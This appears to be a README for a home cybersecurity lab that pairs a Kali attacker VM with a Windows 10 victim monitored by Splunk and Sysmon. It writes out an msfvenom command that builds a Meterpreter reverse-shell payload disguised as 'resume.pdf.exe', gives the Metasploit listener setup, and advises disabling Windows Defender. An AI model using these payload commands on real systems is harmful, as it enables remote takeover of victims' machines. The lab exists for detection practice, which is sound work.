# 🖥️❗ Cybersecurity Home Lab: Detection attacks using Splunk

## Introduction

1. Step 1: Creating Virtual Machines
2. Step 2: Setting Up Splunk for Log Tracking
3. Step 3: Adding Sysmon to Windows 10
4. Step 4: Crafting Malware with msfvenom
5. Step 5: Configuring a Metasploit Listener
6. Step 6: Analyzing Logs in Splunk
7. Fixing Issues
8. Future Ideas
Contributing
Wrap-Up

## 📝 Introduction
This project guides you through building a home lab to practice cybersecurity skills. It includes an attacking system (Kali Linux), a victim system (Windows 10 virtual machine), and a log-monitoring tool (Splunk) to observe and analyze malicious actions. You’ll set up virtual environments, configure logging with Sysmon, create malware using msfvenom, and track the results in Splunk.

## 🛠️ What You’ll Need
| Requirement                  | Description                                      |
|------------------------------|--------------------------------------------------|
| **RAM**                      | At least **16GB** (to run multiple VMs)         |
| **Virtualization Software**  | VMware Workstation or VirtualBox                |
| **Operating Systems**        | ISO files for Windows 10 and Kali Linux         |
| **Logging Tools**            | Splunk and Sysmon setup files                   |
| **Internet Connection**      | Required for downloading and configuring tools  |


## 🌐 Network Layout
Here’s a basic diagram of how the systems connect:

```
   [Kali Linux (Attacker - 192.168.20.11)]  --->  [Windows 10 VM (Defender - 192.168.20.10)]  --->  [Splunk (Log Monitoring)]
```
Kali launches an attack on the Windows VM, and Splunk captures the logs for review.

## Step 1: Creating Virtual Machines
### 1.1 Kali Linux (Attacker Setup)
Grab the Kali Linux ISO from Kali’s site.
Set up a new VM in your virtualization software and install Kali.
Update the system:
```
sudo apt update && sudo apt upgrade -y
```

### 1.2 Windows 10 (Victim Setup)
Download the Windows 10 ISO from Microsoft.
Create a VM and install Windows 10.
Make sure the VMs can communicate over the network.

> **Note:** The following link is for a more in-depth explanation on how to download and configure both VM's and the VM software: https://github.com/GeorgeOrt708/How-to-create-an-Attack-and-Defense-Cyber-Security-Lab

## Step 2: Setting Up Splunk for Log Tracking
Get Splunk Free from Splunk’s site.
Install it on your Windows 10 VM.
Launch Splunk, log in as admin, and turn on log collection.
## Step 3: Adding Sysmon to Windows 10
Download Sysmon from Microsoft Sysinternals.
Get a sample sysmonconfig.xml from Sysmon Modular.
Open PowerShell (Admin) and run:

```
cd "C:\Users\Downloads\sysmon"
.\sysmon64.exe -i sysmonconfig.xml
```
Check if Sysmon is active:

```
Get-Process sysmon64
```
## Step 4: Crafting Malware with msfvenom
On Kali, create a malicious file:

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your_Attacker_IP> LPORT=4444 -f exe -o resume.pdf.exe
```
This generates resume.pdf.exe, a disguised payload.
## Step 5: Configuring a Metasploit Listener
Start Metasploit on Kali:
```
msfconsole
```
Set up the listener:
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <Your_Attacker_IP>
set LPORT 4444
exploit
```
Run resume.pdf.exe on the Windows VM.
If it works, you’ll get a Meterpreter session:
```
meterpreter > sysinfo
```

## Step 6: Analyzing Logs in Splunk
In Splunk, search for suspicious activity:
```
index=main sourcetype=WinEventLog:Security
```
Look for signs of unauthorized access.
Set up alerts for unusual events.

## 🛡️ Fixing Issues
1. Metasploit Not Connecting
Turn off Windows Defender to avoid payload blocking.
Verify LHOST and LPORT match in msfvenom and Metasploit.
Run the payload with admin rights on Windows.
2. Splunk Missing Logs
Confirm Sysmon is installed and running.
Check that Splunk is set to collect Windows logs.
Restart Splunk and test the event index.


## 🎉 Conclusion
This project shows you how to:
* Build a home cybersecurity lab
* Launch and spot malware
* Use Splunk to watch for threats

> **Note:** These tools should only be used for educational purposes. Don’t misuse these skills!
